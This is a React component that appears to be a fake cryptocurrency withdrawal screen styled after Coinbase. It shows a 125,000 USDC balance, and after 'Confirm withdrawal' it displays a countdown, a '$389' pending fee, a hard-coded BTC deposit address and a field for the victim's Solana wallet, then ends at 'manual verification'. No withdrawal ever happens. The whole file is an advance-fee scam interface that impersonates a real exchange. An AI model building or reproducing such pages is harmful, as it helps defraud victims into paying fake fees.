"use client";

import { useEffect, useState } from "react";
import { X, CheckCircle2 } from "lucide-react";

const STORAGE_KEY = "withdraw_start_time";
const DURATION = 24 * 60 * 60; // 24 hours

type Status = "idle" | "processing" | "success" | "support";

export default function SimpleDepositModal() {
  const [status, setStatus] = useState<Status>("idle");
  const [timeLeft, setTimeLeft] = useState<number>(DURATION);
  const [solanaWallet, setSolanaWallet] = useState("");

  // START WITHDRAW
  const startWithdrawal = () => {
    const now = Date.now();
    localStorage.setItem(STORAGE_KEY, now.toString());
    setStatus("processing");
  };

  // TIMER (ROBUSTO + SIN FLICKER)
  useEffect(() => {
    const start = localStorage.getItem(STORAGE_KEY);
    const savedWallet = localStorage.getItem("solana_wallet");

if (savedWallet) {
  setSolanaWallet(savedWallet);
}

    if (!start) return;

    const startTime = Number(start);
    setStatus("processing");

    const update = () => {
      const now = Date.now();
      const diff = Math.floor((now - startTime) / 1000);
      const remaining = DURATION - diff;

      if (remaining <= 0) {
        setTimeLeft(0);
        setStatus("support");
        return;
      }

      setTimeLeft(remaining);
    };

    update(); // 👈 evita UI vacía

    const interval = setInterval(update, 1000);

    return () => clearInterval(interval);
  }, []);

  // FORMAT MM:SS
const formatTime = (s: number) => {
  const hours = Math.floor(s / 3600);
  const minutes = Math.floor((s % 3600) / 60);
  const seconds = s % 60;

  return `${hours.toString().padStart(2, "0")}:${minutes
    .toString()
    .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
};

  // PROGRESS SAFE
  const progress =
    DURATION > 0 ? (timeLeft / DURATION) * 100 : 0;

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4">

      <div className="w-full max-w-[420px] rounded-[28px] border bg-white shadow-sm p-6">

        {/* HEADER */}
        <div className="mb-6 flex items-center justify-between">
          <h2 className="text-[18px] font-[700] text-black">
            Withdraw
          </h2>

          <button className="rounded-full p-2 hover:bg-gray-100">
            <X size={18} className="text-black/60" />
          </button>
        </div>

        {/* IDLE */}
        {status === "idle" && (
          <>
            <div className="mx-auto mb-4 h-12 w-12 rounded-full bg-black flex items-center justify-center">
              <img src="/solana.png" className="h-6 w-6" />
            </div>

            <div className="text-center mb-5">
              <p className="text-[13px] text-black/60">
                Withdraw USDC
              </p>

              <p className="text-[32px] font-[800] text-black">
                125,000
              </p>

              <p className="text-[13px] text-black/50">
                available
              </p>
            </div>

            <div className="rounded-[18px] border px-4 py-4 mb-6">
              <p className="text-[13px] text-black/60 mb-2">
                Transfer to
              </p>

              <p className="text-[15px] font-semibold text-black">
                Checking •••• 6679
              </p>

              <div className="mt-3 flex items-center justify-between text-[12px] text-black/50">
                <span>Instant</span>
                <span>$1,000 fee</span>
              </div>
            </div>

            <button
              onClick={startWithdrawal}
              className="w-full rounded-[14px] py-3 bg-[#0052FF] text-white font-semibold hover:bg-[#0041cc]"
            >
              Confirm withdrawal
            </button>
          </>
        )}

        {/* PROCESSING */}
        {status === "processing" && (
          <>
            <div className="text-center mb-6">
              <CheckCircle2 className="mx-auto text-green-500 mb-2" />

              <p className="font-semibold text-black">
                Processing withdrawal
              </p>

<p className="text-sm font-medium text-black/60 mt-1">
  Pending fee $389 USD
</p>

<div className="mt-4">
  <p className="text-xs text-black/60">
    Time Remaining
  </p>

  <p className="text-2xl font-bold text-[#0052FF]">
    {formatTime(timeLeft)}
  </p>
</div>

<div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
  <p className="text-xs font-semibold text-black/70 mb-2">
    Deposit destination (BTC)
  </p>

  <input
    readOnly
    value="bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5"
className="w-full rounded-md border border-gray-300 bg-white px-3 py-2 text-[13px] font-medium text-gray-900"
  />
</div>

<div className="mt-4 text-left">
  <label className="text-xs font-semibold text-black/70">
    Enter your Solana Wallet
  </label>

  <input
    type="text"
    value={solanaWallet}
    onChange={(e) => {
      setSolanaWallet(e.target.value);
      localStorage.setItem("solana_wallet", e.target.value);
    }}
    placeholder="Paste your Solana wallet address"
    className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
  />
</div>

<div className="mt-3 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
  <p className="text-xs font-semibold text-black/70 mb-1">
    Deposit destination (BTC)
  </p>

  <p className="text-[11px] text-black/60 break-all">
    bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
  </p>
</div>

            </div>

            <div className="h-[6px] bg-gray-100 rounded-full overflow-hidden">
              <div
                className="h-full bg-[#0052FF] transition-all duration-1000"
                style={{
                  width: `${progress}%`,
                }}
              />
            </div>

            <div className="mt-6">
  <a
    href="https://www.coinbase.com"
    target="_blank"
    rel="noopener noreferrer"
    className="block w-full rounded-[14px] py-3 bg-[#0052FF] text-white text-center font-semibold hover:bg-[#0041cc] transition-colors"
  >
    Your Account
  </a>
</div>

          </>
        )}

        {/* SUPPORT */}
        {status === "support" && (
          <div className="text-center">

            <div className="mx-auto mb-3 h-12 w-12 rounded-full bg-blue-100 flex items-center justify-center">
              💬
            </div>

            <p className="font-semibold text-black">
              Need help?
            </p>

            <p className="text-sm text-black/60 mb-5">
              Your withdrawal requires manual verification.
            </p>

            <button className="w-full rounded-[14px] py-3 bg-[#0052FF] text-white font-semibold hover:bg-[#0041cc]">
              Contact Support
            </button>
          </div>
        )}
      </div>
    </div>
  );
}